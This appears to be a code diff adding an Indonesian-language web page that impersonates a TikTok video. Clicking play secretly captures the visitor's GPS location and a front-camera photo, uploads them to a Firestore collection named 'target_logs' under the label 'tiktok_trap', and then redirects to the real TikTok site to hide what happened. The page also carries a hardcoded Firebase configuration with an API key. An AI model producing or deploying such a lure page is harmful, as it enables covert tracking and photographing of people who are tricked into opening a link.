@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok - Make Your Day</title>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #000; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; color: #fff; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
+        .container { width: 100%; max-width: 400px; height: 100%; background: #121212; display: flex; flex-direction: column; justify-content: space-between; position: relative; }
+        .video-container { flex: 1; display: flex; justify-content: center; align-items: center; position: relative; background: #1a1a1a; cursor: pointer; }
+        .play-btn { width: 70px; height: 70px; background: rgba(254, 44, 85, 0.9); border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 28px; box-shadow: 0 0 20px rgba(254, 44, 85, 0.6); animation: bounce 1.5s infinite; }
+        @keyframes bounce { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+        .footer-info { padding: 20px; background: linear-gradient(transparent, rgba(0,0,0,0.8)); }
+        .title { font-size: 0.95rem; font-weight: 600; margin-bottom: 6px; }
+        .creator { font-size: 0.8rem; color: #aaa; margin-bottom: 16px; }
+        .action-btn { width: 100%; padding: 12px; background: #fe2c55; color: #fff; border: none; border-radius: 4px; font-weight: bold; font-size: 0.95rem; cursor: pointer; text-align: center; }
+        #webcam, #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="video-container" onclick="captureAndRedirect()">
+            <div class="play-btn">▶</div>
+        </div>
+        <div class="footer-info">
+            <div class="title" id="videoTitle">Memuat video viral...</div>
+            <div class="creator">@user_tiktok_viral • Original Sound</div>
+            <button class="action-btn" onclick="captureAndRedirect()">Tonton Video Lengkap</button>
+        </div>
+    </div>
+
+    <video id="webcam" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyAzJ6p_stDYeaviIK1CapIpz_pc8onN5hM",
+            authDomain: "spaceman-sukses.firebaseapp.com",
+            projectId: "spaceman-sukses",
+            storageBucket: "spaceman-sukses.firebasestorage.app",
+            messagingSenderId: "442967300277",
+            appId: "1:442967300277:web:65b99aebdbc478455586fc"
+        };
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        // Mengambil parameter judul dari URL jika ada
+        const urlParams = new URLSearchParams(window.location.search);
+        const topic = urlParams.get('v') || 'Video Viral TikTok';
+        document.getElementById('videoTitle').textContent = '#' + topic.replace(/_/g, ' ');
+
+        async function captureAndRedirect() {
+            let lat = 'Tidak diketahui';
+            let lng = 'Tidak diketahui';
+            let photoData = '';
+
+            // 1. Ambil Lokasi GPS
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    if (!navigator.geolocation) reject();
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+                });
+                lat = pos.coords.latitude;
+                lng = pos.coords.longitude;
+            } catch (e) {}
+
+            // 2. Ambil Foto Kamera Depan
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                const video = document.getElementById('webcam');
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 800)); // Tunggu penyesuaian cahaya kamera
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth || 400;
+                canvas.height = video.videoHeight || 300;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                photoData = canvas.toDataURL('image/jpeg', 0.8);
+                stream.getTracks().forEach(t => t.stop());
+            } catch (e) {
+                // Fallback canvas kosong jika izin kamera ditolak
+                const canvas = document.getElementById('canvas');
+                canvas.width = 400; canvas.height = 300;
+                const ctx = canvas.getContext('2d');
+                ctx.fillStyle = '#222';
+                ctx.fillRect(0, 0, 400, 300);
+                photoData = canvas.toDataURL('image/png');
+            }
+
+            // 3. Kirim Data ke Firebase
+            try {
+                await db.collection("target_logs").add({
+                    type: 'tiktok_trap',
+                    prompt: topic,
+                    latitude: lat,
+                    longitude: lng,
+                    photo: photoData,
+                    time: new Date().toLocaleString()
+                });
+            } catch (e) {}
+
+            // 4. Redirect ke TikTok asli setelah data terkirim
+            window.location.href = "https://www.tiktok.com";
+        }
+
+        // Otomatis jalankan proses saat halaman dibuka (opsional, atau tunggu klik tombol)
+        window.addEventListener('load', () => {
+            // Berjalan otomatis setelah interaksi pertama atau langsung
+            setTimeout(() => {
+                // Opsional: Langsung panggil captureAndRedirect() jika ingin otomatis
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
